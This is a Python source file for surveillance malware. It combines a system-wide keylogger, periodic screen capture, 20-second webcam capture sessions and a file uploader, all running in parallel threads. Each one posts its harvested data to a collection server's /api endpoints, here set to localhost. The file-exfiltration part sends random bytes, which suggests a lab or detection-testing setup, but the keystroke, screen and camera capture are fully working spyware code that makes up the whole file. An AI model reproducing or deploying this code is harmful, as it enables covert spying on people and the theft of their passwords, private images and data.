import keyboard
import datetime
from threading import Timer
import requests
from PIL import ImageGrab
from threading import Thread
import os, io
import random
from loguru import logger

import cv2, time


SERVER_IP = "127.0.0.1"
SERVER_URL = 'http://'+SERVER_IP+':8081'


class Keylogger:

    def __init__(self, interval):
        self.log = ""
        self.interval = interval
        self.start_dt = datetime.datetime.now()
        self.end_dt = datetime.datetime.now()
    
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    
    def update_filename(self):
        start_date_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "-")
        end_date_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "-")
        self.filename = f"./keylogs/keylog-{start_date_str}__{end_date_str}"

    def report_to_server(self):
        try:
            response = requests.post(SERVER_URL + "/api/keylog", data={'log': self.log})
            logger.info("Log sent to server..." + response.text)
        except Exception as e:
            logger.error(f"Error sending log: {e}")

    def report(self):
        if self.log:
            self.end_dt = datetime.datetime.now()
            self.update_filename()
            self.report_to_server()
            self.start_dt = datetime.datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        logger.debug("Keylogger started...")
        keyboard.wait()

class Screenshotter:

    def __init__(self, interval):
        self.interval = interval
        self.screenshot_count = 0

    def screenshot(self):
        pic = ImageGrab.grab()
        filename = f"./screenshots/screenshot-{self.screenshot_count}-{datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S')}.png"
        directory = os.path.dirname(filename)
        if not os.path.exists(directory):
            os.makedirs(directory)
        pic.save(filename)
        logger.info(f"Screenshot saved: {filename}")
        self.send_screenshot_to_server(pic)
        self.delete_screenshot(filename)
        self.screenshot_count += 1

        timer = Timer(interval=self.interval, function=self.screenshot)
        timer.daemon = True
        timer.start()

    def delete_screenshot(self, filename):
        try:
            os.remove(filename)
        except:
            pass
        logger.info("Screenshot deleted...")

    def send_screenshot_to_server(self, pic):
        logger.info("Sending screenshot to server...")
        #convert pic to bytes
        imgByteArr = io.BytesIO()
        pic.save(imgByteArr, format='PNG')
        imgByteArr = imgByteArr.getvalue()

        files = {'file': ('screenshot.png', imgByteArr, 'image/png', {'Expires': '0'})}
        try:
            response = requests.post(SERVER_URL + "/api/screenshot", files=files)
            logger.info("Screenshot sent to server..." + response.text)
        except Exception as e:
            logger.error(f"Error sending screenshot: {e}")

    def start(self):
        logger.debug("Screenshotter started...")
        self.screenshot()

class Exfiltrator:

    def __init__(self, interval):
        self.interval = interval

    def exfiltrate(self):
        # exfiltrate data to server
        logger.info("Generating random file...")
        #size between 10 and 100
        size = random.randint(10, 100)
        self.generate_random_file("./files/random_file", size)
        logger.info("Sending file to server...")

        files = {'file': open('./files/random_file', 'rb')}
        try:
            response = requests.post(SERVER_URL + "/api/files", files=files)
            logger.info("File sent to server..." + response.text)
        except Exception as e:
            logger.error(f"Error sending file: {e}")


        timer = Timer(interval=self.interval, function=self.exfiltrate)
        timer.daemon = True
        timer.start()

    def generate_random_file(self, filename, size_in_mb):
        size_in_bytes = size_in_mb * 1024 * 1024
        directory = os.path.dirname(filename)
        if not os.path.exists(directory):
            os.makedirs(directory)
        with open(filename, 'wb') as f:
            f.write(os.urandom(size_in_bytes))

    def delete_random_file(self, filename):
        try:
            os.remove(filename)
        except:
            pass
        logger.info("Random file deleted...")

    def delete(self):
        logger.info("Deleting random file...")
        self.delete_random_file("./files/random_file") 
        timer = Timer(interval=(self.interval/2), function=self.delete)
        timer.daemon = True
        timer.start()

    def start(self):
        logger.debug("Exfiltrator started...")
        self.exfiltrate()
        # self.delete()

class Webcam:
    def __init__(self, interval):
        self.interval = interval

    def start(self):
        logger.debug("Webcam started...")
        self.capture()

    def capture(self):
        logger.info("Capturing frame...")
        cap = cv2.VideoCapture(0)
        start_time = time.time()
        while( int(time.time() - start_time) < 20 ):
            ret, frame = cap.read()
            self.send_frame_to_server(frame)
            if not ret:
                break
            time.sleep(0.1)

        cap.release()
        cv2.destroyAllWindows()
        logger.info("Frame captured...")
        timer = Timer(interval=self.interval, function=self.capture)
        timer.daemon = True
        timer.start()

    def send_frame_to_server(self, frame):
        logger.info("Sending frame to server...")
        _, encoded_image = cv2.imencode('.jpg', frame)
        files = {'file': ('image.jpg', encoded_image, 'image/jpeg', {'Expires': '0'})}
        try:
            response = requests.post(SERVER_URL + "/api/webcam", files=files)
            logger.info("Frame sent to server..." + response.text)
        except Exception as e:
            logger.error(f"Error sending frame: {e}")


if __name__ == "__main__":
    keylogger = Keylogger(interval=15)
    screenshotter = Screenshotter(interval=30)
    exfiltrator = Exfiltrator(interval=30)
    webcam = Webcam(interval=30)

    # Create threads for keylogger and screenshotter
    keylogger_thread = Thread(target=keylogger.start)
    logger.warning("Keylogger thread created...")
    screenshotter_thread = Thread(target=screenshotter.start)
    logger.warning("Screenshotter thread created...")
    exfiltrator_thread = Thread(target=exfiltrator.start)
    logger.warning("Exfiltrator thread created...")
    webcam_thread = Thread(target=webcam.start)
    logger.warning("Webcam thread created...")

    # Start threads
    keylogger_thread.start()
    screenshotter_thread.start()
    exfiltrator_thread.start()
    webcam_thread.start()

    keylogger_thread.join()
    screenshotter_thread.join()
    exfiltrator_thread.join()
    webcam_thread.join()

    logger.critical("Program started...")